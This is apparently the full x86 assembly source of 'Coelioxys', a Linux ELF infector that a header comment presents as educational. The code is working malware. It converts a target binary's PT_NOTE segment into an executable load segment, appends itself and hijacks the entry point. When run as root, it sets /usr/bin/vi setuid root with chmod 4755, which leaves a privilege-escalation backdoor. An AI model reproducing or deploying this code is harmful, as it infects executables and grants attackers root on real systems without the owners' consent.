.text
.globl _start

########################## Coelioxys ############################
####	This is the source code of the parasite 'Coelioxys'.	#
####	It relies on Linux systems and it is designed to	#
####	educational purposes. It is written for the x86		#
####	architecture, although it could work on x86-64 systems	#
####	with some little adjustments... Run this program	#
####	only on controled environments. The author reserves	#
####	the right not to be responsible for the possible	#
####	misuse of Coelioxys. Please, use it to do the world	#
####	a better place. fervagar@tuta.io			#
#################################################################

_start:
  xor %ebp, %ebp
  and $0xfffffff0, %esp
  pushl $0xb			## Number of variables
  pushl $0x16c			## Offset to the Entry Point jump
  mov %esp, %ebp

  movl 0x4(%ebp), %eax
  leal (,%eax,4), %eax
  subl %eax, %esp       	## Stack frame

  ####| Get the address of _start() |####
  call getshellcodeAddr$

getshellcodeAddr$:

  popl %ebx
  subl $0x1f, %ebx
  movl %ebx, -0x4(%ebp)		## Addr of shellcode
  movl $0x27e, -0x8(%ebp)	## Size of shellcode
 
  ## int setreuid(uid_t ruid, uid_t euid); ##
  ####| __NR_setreuid => 70 |#### 
  xor %eax, %eax
  movb $0x46, %al
  xor %ebx, %ebx
  xor %ecx, %ecx
  int $0x80

  ####| Check root perms |####
  ####| __NR_geteuid => 49 |####
  xor %eax, %eax
  movb $0x31, %al
  int $0x80

  test %eax, %eax
  jne continue$

  ####| With root perms |####
  call getEIP_1$

getEIP_1$:
  popl %esi
  jmp binstr$

  popl %ebx			## %ebx <- '/bin/vi'

  ####| __NR_chmod => 15 |####
  ####| int chmod(const char *path, mode_t mode); |####
  movb $0x0f, %al
  xor %ecx, %ecx
  movw $0x9ED, %cx
  int $0x80			## chmod 4755

  ####| In this case the job is already done |####
  jmp __do_exit$
  
  ####| Without root perms |####
continue$:

  ####| open /tmp/target |####
  call getEIP_2$

getEIP_2$:
  popl %esi
  jmp tmpfile$

  popl %ebx			## %ebx <- &filename

  ########| Cukoo SubRoutine |########

  call getfd$
  cmp $0x0, %eax
  jl __do_exit$		## ( if %eax < 0 )

  ####| Get the original Entry Point |####
  movl -0x14(%ebp), %esi
  movl 0x18(%esi), %ebx		## e_entry

  ####| If it is 0x70000000 is already infected |####
  cmp $0x70000000, %ebx
  je _s_clean$


  movl %ebx, -0x1c(%ebp)	## Save Original Entry Point (ebp - 0x1c)

  ####| Get the Program Header Table |####
  movl 0x1c(%esi), %eax		## elfHeader->e_phoff
  addl %esi, %eax
  movl %eax, -0x20(%ebp)	## Save the PHT	(ebp - 0x20)

  ####| Get the NOTE Segment |####
  xor %ebx, %ebx
  movw 0x2c(%esi), %bx		## elfHeader->e_phnum

  call getNoteSegment$

  ####| Check if %eax is NULL |##
  test %eax, %eax
  je _s_clean$

  ####| Save the PAGE SIZE |####
  movl $0x1000, %ebx		## x86 page size => 4K
  movl %ebx, -0x24(%ebp)	## Page Size (ebp - 0x24)

  ####| Get the shellcode offset |####
  movl -0x10(%ebp), %edx	## fileSize
  xor %ecx, %ecx
  sub %ebx, %ecx
  and %ecx, %edx
  add %ebx, %edx		## %edx <- aligned offset of shellcode

  ####| Modify the NOTE segment |####
  movl $0x1, 0x0(%eax)		## p_type = PT_LOAD;
  movl %edx, 0x4(%eax)		## p_offset = shellcode_offset;
  movl $0x70000000, %ecx
  movl %ecx, 0x8(%eax)		## p_vaddr = 0x70000000;
  movl %ecx, 0xc(%eax)		## p_paddr = p_vaddr;
  movl -0x8(%ebp), %edx	
  movl %edx, 0x10(%eax)		## p_filesz = shellcode size;
  movl %edx, 0x14(%eax)		## p_memsz = p_filesz;
  movl $0x7, 0x18(%eax)		## p_flags = PF_R | PF_W | PF_X;
  movl %ebx, 0x1c(%eax)		## p_align = pagesize;

  ####| Set the new Entry Point |####
  movl -0x14(%ebp), %esi
  movl %ecx, 0x18(%esi)		## e_entry = p_vaddr;

  ####| Calculate the size of the padding |#### 
  movl 0x4(%eax), %ecx		## %ecx <- shellcode offset
  movl -0x10(%ebp), %edx	## %edx <- fileSize
  subl %edx, %ecx		## padding size = shellcode offset - fileSize
  movl %ecx, -0x28(%ebp)	## Save the Padding Size     (ebp - 0x28)
 
  ####| Reserve space to the padding |####
  subl %ecx, %esp
  movl %esp, %esi
  dec %esi
_padd_loop$:
  leal (%ecx, %esi), %edi
  movb $0x0, (%edi)
  loop _padd_loop$

  ####| Rewrite the binary |####
  ####| __NR_write => 4 |####
  xor %eax, %eax
  movb $0x4, %al
  ####| write(fd, fileBase, fileSize); |####
  movl -0xc(%ebp), %ebx
  movl -0x10(%ebp), %edx
  movl -0x14(%ebp), %ecx
  int $0x80

  ####| write(fd, padding, padding_size); |####
  xor %eax, %eax
  movb $0x4, %al
  movl %esp, %ecx
  movl -0x28(%ebp), %edx 
  int $0x80

  ####| Save a backup of my Entry Point |####
  movl -0x4(%ebp), %esi		## Retrieve the Shellcode Addr
  movl (%ebp), %edi		## Get the offset to the jump addr
  addl %esi, %edi
  movl (%edi), %ebx
  movl %ebx, -0x2c(%ebp)	## Save my own Entry Point (ebp - 0x2c)

  ####| Modify the jump to the target binary |####
  movl -0x1c(%ebp), %eax	## Retrieve the saved Entry Point (target)
  movl %eax, (%edi)

  ####| write(fd, shellcode, shellcode_size); |####
  movl -0xc(%ebp), %ebx		## Restore %ebx with 'fd'
  xor %eax, %eax
  movb $0x4, %al
  movl %esi, %ecx
  movl -0x8(%ebp), %edx		## Shellcode size
  int $0x80


  ####| Restore my jump |####
  movl -0x2c(%ebp), %eax
  movl %eax, (%edi)

  ####| Restore the space of the padding |####
  movl -0x28(%ebp), %eax
  addl %eax, %esp

  ####| Free resources |####
_s_clean$:
  call munmap$			## munmap(fileBase, fileSize);
_s_close_fd$:
  movl -0xc(%ebp), %eax		## Saved file descriptor
  call close$			## close(fd);

__do_exit$:

  movl 0x4(%ebp), %eax
  leal (,%eax,4), %eax
  addl %eax, %esp		## Remove the entire stack frame ##
  pop %eax
  pop %eax

  xor %ebp, %ebp
  xor %eax, %eax
  xor %ebx, %ebx
  xor %ecx, %ecx
  xor %edx, %edx
  xor %esi, %esi
  xor %edi, %edi

_orig_start$:
  pushl $0x00031337		## Addr dynamically replaced
  ret
  nop

  ####| This should'nt execute never |####
  ####| Exit (just in case) |####
  xor %eax, %eax
  movb $0x1, %al
  xor %ebx, %ebx
  int $0x80

#####################################################

####| __NR_open => 5 |####
####| int open(const char *pathname, int flags); |####
open$:
  xor %eax, %eax
  xor %edx, %edx
  movb $0x5, %al
  movl $0x1b6, %edx
  int $0x80
  ret

#####################################################

####| __NR_close => 6 |####
####| int close(int fd); |####
close$:
  movl %eax, %ebx
  xor %eax, %eax
  movb $0x6, %al
  int $0x80
  ret

#####################################################

####| __NR_mmap => 90 |####
####| void *mmap(void *addr, size_t length, int prot, 
#####	      int flags, int fd, off_t offset); |####
mmap$:
  xor %eax, %eax
  movb $0x5a, %al
  int $0x80
  ret

#####################################################

####| __NR_munmap => 91 |####
####| int munmap(void *addr, size_t length); |####
munmap$:
  movl -0x14(%ebp), %ebx	## fileBase ptr
  movl -0x10(%ebp), %ecx	## fileSize
  xor %eax, %eax
  movb $0x5b, %al
  int $0x80
  ret

#####################################################

####| __NR_fstat => 108 |####
####| int fstat(int fd, struct stat *buf); |####
fstat$:
  movl %eax, %ebx
  xor %eax, %eax
  movb $108, %al
  subl $0x90, %esp		## Space for the buffer
  movl %esp, %ecx
  int $0x80
  cmp $0x0, %eax
  jne _fstat_exit$

  movl 0x14(%ecx), %edx		## %edx <- file size
  movl %edx, -0x10(%ebp)	## Saved fileSize

_fstat_exit$:
  addl $0x90, %esp
  ret

#####################################################

###| Phdr *getNoteSegment(Phdr *pht, int phnum); |###
####| Search for a segment of type PT_NOTE	|####
getNoteSegment$:
  movl %ebx, %ecx
  test %ebx, %ecx
  jz endloop_nf$

  xor %edx, %edx
top$:  
  movb (%eax), %dl
  cmp $0x4, %edx
  je endloop_f$

  add $0x20, %eax		## sizeof(Elf32_Phdr)
  loop top$

endloop_nf$:
  xor %eax, %eax		## Not Found

endloop_f$:
  ret				## return NOTE segment

#####################################################

####| int getfd(char *filename); |####
####| Auxiliar function to open and map a file |####
getfd$:
  ####| Open |####  
  movl $0x2, %ecx		## O_RDWR : 0x0002
  call open$

  cmp $0x0, %eax
  jl _getfd_err$		## if 0 is > %eax
 
  movl %eax, -0xc(%ebp)		## Save fd

  ####| fstat |####
  call fstat$
  cmp $0x0, %eax
  jne _getfd_close_err$

  ####| mmap |####
  xor %ebx, %ebx
  pushl %ebx			## offset => NULL
  movl -0xc(%ebp), %ecx
  pushl %ecx			## fd
  leal 0x1(%ebx), %ecx
  leal 0x2(%ebx), %edx
  orl %edx, %ecx
  push %edx			## MAP_PRIVATE (0x2)
  push %ecx			## PROT_READ (0x1) | PROT_WRITE (0x2)
  movl -0x10(%ebp), %edx
  pushl %edx			## length => fileSize
  pushl %ebx			## *addr => NULL

  # mmap(NULL, fileSize, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, NULL); #
  movl %esp, %ebx
  call mmap$
  addl $0x18, %esp		## remove the arguments of mmap
  cmpl $0xfffff000, %eax
  ja _getfd_close_err$

  movl %eax, -0x14(%ebp)	## Save the pointer to fileBase

  ####| %edx still contains the size of the file |####
  addl %eax, %edx
  movl %edx, -0x18(%ebp)	## Save the pointer to fileEnd

  ####| Check if the file has an ELF format |####
  movl -0x14(%ebp), %ebx
  movl (%ebx), %eax
  cmp $0x464c457f, %eax
  jne _getfd_munmap_err$

  ####| Check if it's an ELF of the x86 architecture |####
  xor %eax, %eax
  movl -0x14(%ebp), %ebx
  movb 0x12(%ebx), %al
  cmp $0x03, %eax
  jne _getfd_munmap_err$

  ####| Return the file descriptor |####
  # %ecx still contains the fd #
  movl %ecx, %eax
  ret

_getfd_munmap_err$:
  call munmap$

_getfd_close_err$:
  movl -0xc(%ebp), %eax		## Saved fd
  call close$

_getfd_err$:
  xor %eax, %eax
  dec %eax
  ret

#####################################################
#################### Strings #########################

  nop
tmpfile$:
  addl $0x6, %esi
  call *%esi
.string "/tmp/target\0"

  nop
binstr$:
  addl $0x6, %esi
  call *%esi
.string "/usr/bin/vi\0"

